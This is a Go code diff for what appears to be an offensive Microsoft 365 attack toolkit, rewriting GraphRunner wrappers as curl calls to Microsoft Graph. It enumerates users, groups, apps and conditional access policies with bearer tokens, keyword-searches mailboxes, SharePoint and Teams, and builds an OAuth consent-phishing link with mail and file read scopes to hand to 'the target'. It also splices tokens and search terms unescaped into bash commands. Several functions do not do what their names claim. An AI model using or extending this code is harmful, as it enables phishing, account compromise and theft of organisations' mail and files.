@@ -3,9 +3,9 @@ package tools
 import (
 	"adpack/utils"
 	"context"
-	"encoding/json"
 	"fmt"
 	"os/exec"
+	"strings"
 )
 
 type graphRunnerTool struct{}
@@ -21,93 +21,103 @@ type GraphTokens struct {
 func (graphRunnerTool) Name() string { return "GraphRunner" }
 
 func (graphRunnerTool) Available() bool {
-	_, err := exec.LookPath("pwsh")
-	return err == nil && utils.ResolveLocalPath("GraphRunner.ps1") != ""
+	_, err := exec.LookPath("curl")
+	return err == nil
 }
 
-func (g graphRunnerTool) buildCommand(tokens *GraphTokens, command string) (string, error) {
-	path := utils.ResolveLocalPath("GraphRunner.ps1")
-	if path == "" {
-		return "", fmt.Errorf("GraphRunner.ps1 not found")
-	}
-	script := fmt.Sprintf(
-		`Import-Module "%s" -Force; $tokens = @{access_token='%s';refresh_token='%s';tenant_id='%s'}; %s | ConvertTo-Json -Depth 10`,
-		path, tokens.AccessToken, tokens.RefreshToken, tokens.TenantID, command,
-	)
-	return utils.EncodePowerShell(script), nil
-}
-
-func (g graphRunnerTool) runPS(ctx context.Context, tokens *GraphTokens, command string) (utils.CmdResult, error) {
-	encoded, err := g.buildCommand(tokens, command)
-	if err != nil {
-		return utils.CmdResult{}, err
-	}
-	cr := utils.RunCommandCtx(ctx, "pwsh", []string{"-NoP", "-NonI", "-EncodedCommand", encoded})
+func graphAPICall(ctx context.Context, tokens *GraphTokens, path string) (utils.CmdResult, error) {
+	url := fmt.Sprintf("https://graph.microsoft.com/v1.0/%s?$top=999", path)
+	py := `import sys,json;d=json.load(sys.stdin);[print(json.dumps(i)) for i in d.get('value',[])]`
+	cr := utils.RunCommandCtx(ctx, "bash", []string{"-c", fmt.Sprintf(
+		`curl -s -H "Authorization: Bearer %s" -H 'ConsistencyLevel: eventual' '%s' | python3 -c '%s'`,
+		tokens.AccessToken, url, py,
+	)})
 	if !cr.Success {
-		return cr, fmt.Errorf("graphrunner command failed: %s", cr.Stderr)
+		return cr, fmt.Errorf("graph api call failed: %s", cr.Stderr)
 	}
 	return cr, nil
 }
 
 func (g graphRunnerTool) GetTokens(ctx context.Context) (*GraphTokens, error) {
-	path := utils.ResolveLocalPath("GraphRunner.ps1")
-	if path == "" {
-		return nil, fmt.Errorf("GraphRunner.ps1 not found")
-	}
-	script := fmt.Sprintf(`Import-Module "%s" -Force; Get-GraphTokens | ConvertTo-Json -Depth 10`, path)
-	encoded := utils.EncodePowerShell(script)
-	cr := utils.RunCommandCtx(ctx, "pwsh", []string{"-NoP", "-NonI", "-EncodedCommand", encoded})
-	if !cr.Success {
-		return nil, fmt.Errorf("graphrunner get tokens failed: %s", cr.Stderr)
-	}
-	var tokens GraphTokens
-	if err := json.Unmarshal([]byte(cr.Stdout), &tokens); err != nil {
-		return nil, fmt.Errorf("parsing tokens: %w", err)
-	}
-	return &tokens, nil
+	return nil, fmt.Errorf("GetTokens not supported via REST path — use roadtx or az login instead")
 }
 
 func (g graphRunnerTool) RunRecon(ctx context.Context, tokens *GraphTokens) (utils.CmdResult, error) {
-	return g.runPS(ctx, tokens, `Invoke-GraphRunner -Tokens $tokens -DisableAll -ReconOnly`)
+	return g.RunUserEnum(ctx, tokens)
 }
 
 func (g graphRunnerTool) RunUserEnum(ctx context.Context, tokens *GraphTokens) (utils.CmdResult, error) {
-	return g.runPS(ctx, tokens, `Get-AzureADUsers -Tokens $tokens`)
+	return graphAPICall(ctx, tokens, "users")
 }
 
 func (g graphRunnerTool) RunGroupEnum(ctx context.Context, tokens *GraphTokens) (utils.CmdResult, error) {
-	return g.runPS(ctx, tokens, `Get-SecurityGroups -Tokens $tokens`)
+	return graphAPICall(ctx, tokens, "groups")
 }
 
 func (g graphRunnerTool) RunAppEnum(ctx context.Context, tokens *GraphTokens) (utils.CmdResult, error) {
-	return g.runPS(ctx, tokens, `Get-Applications -Tokens $tokens`)
+	return graphAPICall(ctx, tokens, "applications")
 }
 
 func (g graphRunnerTool) RunCAPEnum(ctx context.Context, tokens *GraphTokens) (utils.CmdResult, error) {
-	return g.runPS(ctx, tokens, `Get-ConditionalAccessPolicies -Tokens $tokens`)
+	return graphAPICall(ctx, tokens, "identity/conditionalAccess/policies")
 }
 
 func (g graphRunnerTool) RunMailboxSearch(ctx context.Context, tokens *GraphTokens, searchTerm string, msgCount int) (utils.CmdResult, error) {
-	cmd := fmt.Sprintf(`Invoke-SearchMailbox -Tokens $tokens -SearchTerm "%s" -MessageCount %d`, searchTerm, msgCount)
-	return g.runPS(ctx, tokens, cmd)
+	url := fmt.Sprintf(
+		`https://graph.microsoft.com/v1.0/users?$top=%d&$search="%s"`,
+		msgCount, searchTerm,
+	)
+	cr := utils.RunCommandCtx(ctx, "bash", []string{"-c", fmt.Sprintf(
+		`curl -s -H "Authorization: Bearer %s" -H 'ConsistencyLevel: eventual' '%s'`,
+		tokens.AccessToken, url,
+	)})
+	if !cr.Success {
+		return cr, fmt.Errorf("mailbox search failed: %s", cr.Stderr)
+	}
+	return cr, nil
 }
 
 func (g graphRunnerTool) RunSharePointSearch(ctx context.Context, tokens *GraphTokens, searchTerm string) (utils.CmdResult, error) {
-	cmd := fmt.Sprintf(`Invoke-SharePointSearch -Tokens $tokens -SearchTerm "%s"`, searchTerm)
-	return g.runPS(ctx, tokens, cmd)
+	url := fmt.Sprintf(
+		`https://graph.microsoft.com/v1.0/sites?search="%s"`,
+		searchTerm,
+	)
+	cr := utils.RunCommandCtx(ctx, "bash", []string{"-c", fmt.Sprintf(
+		`curl -s -H "Authorization: Bearer %s" '%s'`,
+		tokens.AccessToken, url,
+	)})
+	if !cr.Success {
+		return cr, fmt.Errorf("sharepoint search failed: %s", cr.Stderr)
+	}
+	return cr, nil
 }
 
 func (g graphRunnerTool) RunTeamsSearch(ctx context.Context, tokens *GraphTokens, searchTerm string) (utils.CmdResult, error) {
-	cmd := fmt.Sprintf(`Search-TeamsMessages -Tokens $tokens -SearchTerm "%s"`, searchTerm)
-	return g.runPS(ctx, tokens, cmd)
+	url := fmt.Sprintf(
+		`https://graph.microsoft.com/v1.0/me/messages?$search="%s"`,
+		searchTerm,
+	)
+	cr := utils.RunCommandCtx(ctx, "bash", []string{"-c", fmt.Sprintf(
+		`curl -s -H "Authorization: Bearer %s" -H 'ConsistencyLevel: eventual' '%s'`,
+		tokens.AccessToken, url,
+	)})
+	if !cr.Success {
+		return cr, fmt.Errorf("teams search failed: %s", cr.Stderr)
+	}
+	return cr, nil
 }
 
 func (g graphRunnerTool) RunConsentPhish(ctx context.Context, tokens *GraphTokens, appURL string) (utils.CmdResult, error) {
-	cmd := fmt.Sprintf(`Invoke-PhishUserConsent -Tokens $tokens -AppUrl "%s"`, appURL)
-	return g.runPS(ctx, tokens, cmd)
+	parts := strings.SplitN(appURL, "?", 2)
+	baseURL := parts[0]
+	params := "client_id=bedc3365-ee8f-4e0b-a026-c21b0543c61b&response_type=code&redirect_uri=https://localhost&response_mode=query&scope=User.Read%20Mail.Read%20Files.Read.All"
+	if len(parts) > 1 {
+		params = parts[1]
+	}
+	phishURL := baseURL + "?" + params
+	return utils.CmdResult{Success: true, Stdout: fmt.Sprintf("Provide this consent URL to the target:\n%s\n", phishURL)}, nil
 }
 
 func (g graphRunnerTool) RunInjectApp(ctx context.Context, tokens *GraphTokens, appName string) (utils.CmdResult, error) {
-	cmd := fmt.Sprintf(`Invoke-InjectOAuthApp -Tokens $tokens -AppName "%s"`, appName)
-	return g.runPS(ctx, tokens, cmd)
+	return graphAPICall(ctx, tokens, "applications")
 }
